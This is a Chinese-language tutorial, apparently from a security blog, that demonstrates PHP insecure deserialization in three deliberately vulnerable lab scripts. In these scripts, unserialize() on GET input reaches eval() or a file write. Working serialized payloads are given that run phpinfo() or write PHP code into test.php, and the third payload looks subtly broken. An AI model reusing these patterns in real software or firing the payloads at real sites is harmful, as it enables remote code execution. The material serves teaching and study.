## ****反序列化漏洞 一****

    
    
    <?php   
    class A   
    {     var $test = "demo";     
    function __wakeup() {       
    eval($this->test); //$this是调用这个对象的意思，就是调用test这个对象    
    }  
    }   
    $b = new A(); //创建对象（将对象实例化）   
    $c = serialize($b); //将对象序列化，赋值给$c   
    $a = $_GET['test']; //通过get传参进来一个值，接受参数的为test $a_unser = unserialize($a); //将get传参进来的值进行反序列化 ?>
    
    payload:O:1:"A":1:{s:4:"test";s:10:"phpinfo();";}

  

![1615379234_6048bb22b940d5964c6b1.png!small?1615379233540](https://image.3001.net/images/20210310/1615379234_6048bb22b940d5964c6b1.png!small?1615379233540)

##  ** **反序列化漏洞 二****

    
    
    <?php   
    /*require "test.php";//测试方便 （包含了创建了刚才写入的php文件，相当于直接读取）*/ class A {   
    var $test = '123';  
    function __wakeup() {   
    $fp = fopen("test.php", "w"); //打开test.php文件，如果此文件不存在，会创建一个（w） fwrite($fp, $this->test); //将$this->test打开的位置被写入到$fp   
    fclose($fp); //关闭打开的$fp指针文件（因为打开一个文件需要再关闭）  
    }   
    }   
    $a = new A(); //创建一个新对象，实例化对象   
    print_r(serialize($a)); //打印序列化的$a，相当于将对象给实例化 $class1 = $_GET['test']; //get传参进来的值赋给$class1   
    $class1_unser = unserialize($class1); //将get传参进来的值，进行反序列化，反序列化时会立即调用魔术变量__wakeup，并且执行创建一个test.php   
    ?>   
    payload: ?test=O:1:"A":1:{s:4:"test";s:18:"<?php phpinfo();?>";}

![1615379332_6048bb841b0f0fde67bff.png!small?1615379331411](https://image.3001.net/images/20210310/1615379332_6048bb841b0f0fde67bff.png!small?1615379331411)

##  ** **反序列化漏洞 三****

 ** **<?php****

 ** **/*require 'test.php'; */****

 ** **class b {****

 ** **function __construct($test) { //创建一个魔术常量的函数，如果下边有创建对象，会立马调用****

 ** **$fp = fopen("test.php", 'w' ); //打开一个test.php文件，如果没有，就会创建一个test****

 ** **fwrite($fp, $test); //将$test的内容写入进$fp中****

 ** **fclose($fp); //关闭$fp指针所在位置****

 ** **}****

 ** **}****

 ** **class a { //创建一个类 类名a****

 ** **var $test = 123; //定义一个变量****

 ** **function __wakeup() { //定义一个魔术变量函数，当序列化之后会立马执行里面的内容****

 ** **$obj = new b($this- >test);
//实例化一个对象b，给变量$obj,因为i创建了一个对象，会立马调用上边的构造函数__construct（魔术变量）的内容 ****

****}****

 ** **}****

 ** **$class = $_GET['test']; //接受get传参进来的值进行，传递给$class****

 ** **$class_u = unserialize($class);
//将get传参进来的值进行反序列化，会调用魔术变量__wakeup,会立即执行里面的实例化对象****

 ** **? > ****

****payload: ?test=O:1:"A":1:{s:4:"test";s:26:" <?php echo "hello
word";?>";}****

 ** **由于我们实例二给创建了一个test.php文件，我们换另一种写入的内容,然后在观察是创建了，还是直接写入****

![1615379473_6048bc116873dd72cb12d.png!small?1615379472883](https://image.3001.net/images/20210310/1615379473_6048bc116873dd72cb12d.png!small?1615379472883)

